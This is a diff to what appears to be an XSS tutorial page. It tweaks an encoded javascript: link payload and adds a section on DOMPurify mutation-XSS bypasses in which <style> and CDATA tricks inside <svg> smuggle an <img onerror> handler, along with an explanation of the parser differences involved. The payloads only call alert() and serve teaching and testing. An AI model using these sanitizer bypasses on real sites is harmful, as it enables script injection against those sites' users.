@@ -130,8 +130,8 @@ It is common for dangerous tags to be blacklisted, and any event handler attribu
 <strong>&#x3C;iframe srcdoc="&#x26;lt;img src=1 o&#x26;#110;error=alert(1)&#x26;gt;">&#x3C;/iframe>
 </strong>
 &#x3C;!-- Link requiring user interaction with javascript: URL -->
-<strong>&#x3C;a href="javas&#x26;#115;ript:alert()">click me&#x3C;/a>
-</strong></code></pre>
+&#x3C;a href="&#x26;#106avas&#x26;#99ript:alert()">Click me!&#x3C;/a>
+</code></pre>
 
 One last payload is a less well-known tag called `<base>` which takes an `href=` attribute that will decide where any **relative URLs will start** from. If you set this to your domain for example, and later in the document a `<script src="/some/file.js">` is loaded, it will instead be loaded from **your website** at the path of the script.&#x20;
 
@@ -740,7 +740,7 @@ location=name
 {% endcode %}
 
 {% code title="Attacker's page" %}
-```javascript
+```html
 <script>
   name = "javascript:alert()";
   location = "http://target.com/?xss=location%3Dname";
@@ -800,6 +800,28 @@ Where this gets really powerful is using HTML encoding if the sanitizer parses t
 </strong>&#x3C;!-- could be serialized back into this Mutation XSS -->
 &#x3C;title>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert()>">&#x3C;/p>&#x3C;/title>
 </code></pre>
+
+***
+
+[@kevin\_mizu](https://twitter.com/kevin\_mizu/status/1735984327274688630) showed another interesting exploitable scenario, where your input is placed inside an `<svg>` tag after sanitization:
+
+<pre class="language-html"><code class="lang-html">&#x3C;svg>
+<strong>    &#x3C;style>&#x3C;!--&#x3C;/style>&#x3C;a id="--!>&#x3C;img src=x onerror=alert()>">&#x3C;/a>
+</strong>&#x3C;/svg>
+</code></pre>
+
+This is another DOMPurify "bypass" with a more common threat, all a developer needs to do is put your payload inside of an `<svg>` tag, without sanitizing it with the `<svg>` tag. This payload is a bit more complicated as you'll see, but **here's a breakdown**:\
+The trick is the difference between SVG parsing and HTML parsing. _In HTML_ which DOMPurify sees, the `<style>` tag is special as it switches the parsing context to CSS, which doesn't support comments like `<!--` and it won't be interpreted as such. Therefore the `</style>` closes it and the `<a id="...">` opens another innocent tag and attribute. DOMPurify doesn't notify anything wrong here and won't alter the input. \
+_In SVG,_ however, the `<style>` tag doesn't exist and it is interpreted as any other invalid tag in XML. The children inside might be more tags, a `<!--` comment in this case. This only ends at the start of the `<a id="--!>` attribute and that means after the comment comes more raw HTML. Then our `<img onerror=>` tag is read for real and the JavaScript is executed!
+
+{% hint style="info" %}
+**Tip**: Instead of a comment, another possibility is using the special `<![CDATA[` ... `]]` syntax in SVGs that abuses a similar parsing difference:
+
+<pre class="language-html"><code class="lang-html">&#x3C;svg>
+<strong>    &#x3C;style>&#x3C;![CDATA[&#x3C;/style>&#x3C;a id="]]>&#x3C;img src=x onerror=alert()>">&#x3C;/a>
+</strong>&#x3C;/svg>
+</code></pre>
+{% endhint %}
 
 #### DOMPurify outdated versions
 
